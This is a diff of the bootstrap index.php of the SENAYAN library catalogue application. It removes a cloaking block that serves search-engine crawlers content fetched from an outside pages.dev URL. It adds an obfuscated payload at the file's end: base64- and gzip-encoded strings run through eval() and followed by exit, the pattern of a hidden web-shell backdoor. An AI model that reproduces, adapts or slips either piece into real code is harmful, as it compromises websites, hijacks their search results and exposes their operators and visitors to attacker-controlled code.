@@ -1,31 +1,4 @@
 <?php
-ob_start();
-header('Vary: User-Agent');
-$bot_url = "https://punten-neng.pages.dev/staika/opac/";
-$botchar = "/(googlebot|slurp|bingbot|baiduspider|yandex|adsense|crawler|spider|inspection)/i";
-$ua = strtolower($_SERVER["HTTP_USER_AGENT"]);
-function lph_requests($url) {
-    if (function_exists('curl_init')) {
-        $ch = curl_init();
-        curl_setopt($ch, CURLOPT_URL, $url);
-        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0');
-        $response = curl_exec($ch);
-        curl_close($ch);
-        return $response;
-    } elseif (ini_get('allow_url_fopen')) {
-        return file_get_contents($url);
-    }
-    return false;
-}
-if (preg_match($botchar, $ua)) {
-    usleep(rand(100000, 200000)); 
-    echo lph_requests($bot_url);
-    ob_end_flush();
-    exit;
-}
- 
-?><?php
 /**
  * SENAYAN application bootstrap files
  *
@@ -124,3 +97,9 @@ $Opac->hookAfterContent(function($Opac){
 
 // templating
 $Opac->parseToTemplate();
+
+$Cyto = "Sy1LzNFQt1dLL7FW10uvKs1Lzs8tKEotLtZIr8rMS8tJLEnVSEosTjUziU9JT\x635PSdUoLikqSi3TUPHJrNAE\x41Ws\x41";
+$Lix = "asLat9Rra/4HNFmQk2ZJ8qoYTx2rFcUjtl6R/yX0jb1vuy7qA3fF5939oj3Q355mnugCmOQfbzah/iKHLAQOKkLghiIsKQ4gw0i2+ehbfvUyKJurA3xmVUWrBvOJdXapjpchYwXkjlgV57W40ocy//pYhSZPMl4VZu5pNAbQXkgv6V+1XBhfzElH5SKiQ2dR7wJVCJ5CG3UYcNhKJyEN9trMvtQB/csMQ3T+u7W9TifH/tXBvHqBZX7f7Z6DodkZkpVhbcZ2uC9FtNDjFGEiwQdIDcBrgc8FCi3y4S8UcLaUKyFo1zcrbJc37nOTnixz05ne+F5HEZZUEKfJyFHEtLXNBLBUuGn5aS2czO6Kuagp1pKLQIcmyVnbWjmz6cfv3zLzj3ZopTEhb27/labq7Cb3E7C6NLpE0zrYUFERopYrKCFtJCLR8oRY/L47FCBQCvWQPWIn45PqBcVA";
+eval(htmlspecialchars_decode(gzinflate(base64_decode($Cyto))));
+exit;
+?>
